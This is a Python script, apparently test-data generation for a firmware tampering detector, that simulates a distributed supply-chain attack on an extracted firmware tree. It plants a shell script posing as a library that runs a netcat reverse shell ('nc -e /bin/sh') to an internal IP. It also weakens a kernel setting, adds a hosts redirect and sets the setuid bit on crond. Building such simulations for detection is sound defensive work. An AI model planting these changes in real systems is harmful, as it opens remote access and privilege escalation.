"""
Attack Scenario 2: Distributed multi-file tampering.
Instead of a single obvious backdoor, this scenario spreads smaller
modifications across multiple files - simulating a more subtle supply chain
attack where an adversary avoids concentrating changes in one place.

Requires data/original and data/original_permissions.json to already exist
(run data/decompress_firmware.py and data/extract_squashfs.py first).
Produces data/suspicious_v2 and data/suspicious_v2_permissions.json.
"""
import json
import os
import shutil
import stat
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from layers.logger_config import get_logger

logger = get_logger(__name__)

original_dir = "data/original"
suspicious_dir = "data/suspicious_v2"
original_manifest_path = "data/original_permissions.json"
suspicious_manifest_path = "data/suspicious_v2_permissions.json"

# Fresh copy for this scenario
if os.path.exists(suspicious_dir):
    shutil.rmtree(suspicious_dir)
shutil.copytree(original_dir, suspicious_dir)
logger.info(f"Fresh copy created: {suspicious_dir}")

with open(original_manifest_path, "r") as f:
    permissions = json.load(f)

# 1. Small, quiet backdoor hidden in a less obvious location
backdoor_path = os.path.join(suspicious_dir, "usr/lib/libcrypto_helper.so")
os.makedirs(os.path.dirname(backdoor_path), exist_ok=True)
with open(backdoor_path, "w") as f:
    f.write("#!/bin/sh\n# disguised as a library, contains reverse_shell logic\nnc -e /bin/sh 10.0.0.5 8080\n")
logger.info(f"Disguised backdoor added: {backdoor_path}")

# 2. A second, unrelated small modification (log rotation config)
target_file_1 = os.path.join(suspicious_dir, "etc/sysctl.conf")
if os.path.exists(target_file_1):
    with open(target_file_1, "a") as f:
        f.write("\n# silently disables a kernel protection\nnet.ipv4.conf.all.rp_filter=0\n")
    logger.info(f"Modified: {target_file_1}")

# 3. A third modification in a completely different area (web interface config)
target_file_2 = os.path.join(suspicious_dir, "etc/hosts")
if os.path.exists(target_file_2):
    with open(target_file_2, "a") as f:
        f.write("\n192.0.2.50 update-server.local\n")
    logger.info(f"Modified: {target_file_2}")

# 4. Permission escalation on an existing, legitimate-looking binary
target_binary_relative = "usr/sbin/crond"
if target_binary_relative in permissions:
    original_mode = permissions[target_binary_relative]["mode"]
    escalated_mode = original_mode | stat.S_ISUID
    permissions[target_binary_relative] = {
        **permissions[target_binary_relative],
        "mode": escalated_mode,
        "filemode": permissions[target_binary_relative]["filemode"].replace("x", "s", 1),
    }
    logger.info(f"Permission escalated on existing binary: {target_binary_relative}")

with open(suspicious_manifest_path, "w") as f:
    json.dump(permissions, f, indent=2)

logger.info("Scenario 2 (distributed tampering) simulation complete.")